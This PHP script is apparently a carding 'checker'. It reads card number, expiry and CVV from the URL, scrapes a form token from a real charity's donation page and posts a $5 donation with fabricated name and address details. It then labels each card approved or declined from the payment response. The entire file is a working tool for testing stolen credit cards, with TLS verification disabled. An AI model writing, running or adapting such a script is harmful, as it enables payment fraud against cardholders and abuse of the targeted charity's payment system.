<?php

set_time_limit(0);
error_reporting(0);

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

$estado = "";

if($country == "US"){
	$estado = $state;
}

function doPost($url,$data,$headers){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

if(!empty($data)){
	curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
	curl_setopt($ch, CURLOPT_POST,1);
}

if(!empty($headers)){
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
}

return curl_exec($ch);

}

function getToken($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getBrand($card){
	$brand = '';
	if($card[0] == 5){
		$brand = 'ECMC';
	}else if($card[0] == 4){
		$brand = 'VISA';
	}else{
		$brand =  "Reprobada";
	}

return $brand;
}

function formatMes($mess){
$m = $mess;
	if(strlen($mess) == 2 && $mess <> 10 && $mess <> 11 && $mess <> 12){
		$m = str_replace('0','',$mess);
	}else{
		return $m;
	}

return $m;
}

$r =  doPost('https://www.cair.com/donate');

$token =  getToken($r,'authenticity_token" type="hidden" value="','"');

$mes = formatMes($mes);
$r =  doPost("https://www.cair.com/forms/donations","authenticity_token=$token&page_id=14774&return_to=https%3A%2F%2Fwww.cair.com%2Fauthorize&email_address=&donation%5Bamount%5D=5.00&donation%5Bcustom_values%5D%5Bzakat_ind%5D=0&donation%5Bcard_number%5D=$cc&donation%5Bcard_expires_on%281i%29%5D=$ano&donation%5Bcard_expires_on%282i%29%5D=$mes&donation%5Bcard_expires_on%283i%29%5D=1&donation%5Bcard_verification%5D=$cvv&donation%5Bfirst_name%5D=Peter&donation%5Blast_name%5D=Paterson&donation%5Bbilling_address_attributes%5D%5Bcountry_code%5D=$country&donation%5Bbilling_address_attributes%5D%5Bstate%5D=$estado&donation%5Bbilling_address_attributes%5D%5Baddress1%5D=Av. Patrerinon&donation%5Bbilling_address_attributes%5D%5Baddress2%5D=&donation%5Bbilling_address_attributes%5D%5Baddress3%5D=&donation%5Bbilling_address_attributes%5D%5Bcity%5D=$city&donation%5Bbilling_address_attributes%5D%5Bzip%5D=$zipcode&donation%5Bemail%5D=mitrunfaterin%40gmail.com&donation%5Bbilling_address_attributes%5D%5Bphone_number%5D=154548454848&donation%5Bemail_opt_in%5D=0&donation%5Bis_private%5D=0");

if (strpos($r, 'This transaction has been declined')) {
        echo '<span class="label label-danger">#Reprovada ❌ This transaction has been declined '.$lista.' #nic0la 7esla<br></span>';
}elseif(strpos($r, 'The credit card number is invalid')){
	echo '<span class="label label-danger">#Reprovada ❌ The credit card number is invalid. '.$lista.' #nic0la 7esla<br></span>';
}else if(strpos($r, 'CVV does not match')){
		echo '<span class="label label-danger">#Reprovada ❌ CVV does not match '.$lista.' #nic0la 7esla<br></span>';		
}else if(strpos($r, 'The credit card has expired')){
		echo '<span class="label label-danger">#Reprovada ❌ The credit card has expired '.$lista.' #nic0la 7esla<br></span>';		
		}else{
			//echo $r;
			echo '<span class="label label-success">#Aprovada ✅ '.$lista.' #nic0la 7esla | Informacion |</span> <br>';
		}

?>